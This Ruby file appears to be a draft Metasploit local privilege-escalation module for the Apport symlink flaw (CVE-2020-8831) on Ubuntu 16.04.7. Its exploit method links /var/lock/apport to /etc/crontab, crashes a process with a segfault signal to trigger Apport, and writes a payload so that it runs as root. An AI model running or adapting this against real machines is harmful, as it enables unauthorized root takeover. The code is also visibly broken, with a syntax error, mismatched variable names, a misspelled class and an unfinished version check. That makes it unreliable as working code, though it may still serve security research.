# Randomness itself is a give away of exploitation
class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::Linux::System
  include Msf::Post::File
  include Msf::Post::File::FileStat

  # TODO get exact apport version after setting up a test environment
  # TODO targets in the initialize method and how they work
  # TODO other priv esc vectors, startup folders, periodic scripts 
  # The vunerable version of apport may be available on other systems, distros and versions 

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ubuntu Xenial Xerus Apport Symlink Hijacking Privilege Escalation ',
        'Description' => %q{
        	On the Ubuntu Xenial Xerus 16.04.7 release the Apport 2.20 crash handler is vulnerable
        	to symlink injection. Following a crash Apport will write reports to /var/lock/apport/lock, 
        	an attacker who can create a symlink to a privileged directory via /var/lock/apport will be 
        	able to create files with global 0777 permissions. This module exploits this weaknes by writing 
        	payloads to /etc/crontab/ as the root user.  
          
        },
        'License' => MSF_LICENSE,
        'Author' => [ 
        	'gardnerapp' # mirageinfosec.cloud
        ],
        'References' => [
          [
           'URL', 'https://nostarch.com/zero-day', # pg. 59
           'URL', 'https://ubuntu.com/security/CVE-2020-8831',
           'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-8831'
          ]
        ],
        'Platform' => 'linux',
        'Targets' => [
          [
            'Linux_Binary',
            {
              'Arch' => [ARCH_AARCH64, ARCH_X64]
            }
          ],
          [
            'Linux_Command',
            {
              'Arch' => ARCH_CMD
               'Payload' =>
                {
                  'BadChars' => "\x22\x27"
                }
            }
          ]
        ],
        'Payload' => {
          'BadChars' => "\x00"
        },
        'Privileged' => false,
        'DisclosureDate' => '2 April 2020',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        },
      )
    )
  end

  def check
  	return CheckCode::Safe('Platform is not Linux') unless session.platform == 'linux'

  	return CheckCode::Safe('Target is not Ubuntu') unless kernel_version =~ /[uU]buntu/

    # Todo check distro version here 
    # Determine is xenail, and vxenial release version

    sys_info = get_sysinfo
    puts system_info

    distro = sysinfo[:distro]
    puts distro
    version = sysinfo[:version]
    puts system_info

    # Maybe add <||= for the version, need to find out if other kernel versions are vulmerable
    if distro != 'Xenial Xerus' || version != '16.04.7'
      return CheckCode::Safe('Target is not the correct Linux distro or kernel version')
    end 

  	# Check apport version
  	if !command_exists?('apport-cli')
  		return CheckCode::Safe('apport-cli does not appear to be installed or in the $PATH') 
  	end 

  	apport = cmd_exec('apport-cli --version').to_s 

  	return CheckCode::Detected('Unable to determine apport version') if apport.blank?

  	version = Rex::Version.new(apport.split('-').first)

  	vulnerable = Rex::Version.new '2.20'
  	# Were there prior versions of apport which are NOT vulnerableii
  	# if version < vulnerable return bad 
  end

  def exploit
    # Create symlink
    # TODO error handling here, perhaps try and catch statement
    # might need to change linked directory
    cmd_exec 'ln -s /etc/crontab /var/lock/apport'

    # Crash with segfault to trigger apport
    cmd_exec 'sleep 10s & kill -11 $!'

    # need method for seeing if file is owned by root and combine with and gate
    # if uid method does not work remove Msf::Post::File::FileStat
    if !writable?('/etc/crontab/lock') || uid('/etc/crontab/lock') != 0
      fail_with(Failue::NotFound, 'Exploit was unable to create a crontab owned by root.')
    end

    print_status 'Uploading payload'

    # create the payload
    if target.arch.first == ARCH_CMD
      payload = payload.encoded
      write_file('/etc/crontab/lock', payload)
    else 
      payload_file = '/tmp/' + Rex::Text.rand_text_alpha(rand(6..13))
      chmod(payload_file)
      write_file payload_file, generate_payload_exe
      write_file '/etc/crontab/lock', payload_file
    end 
  end
end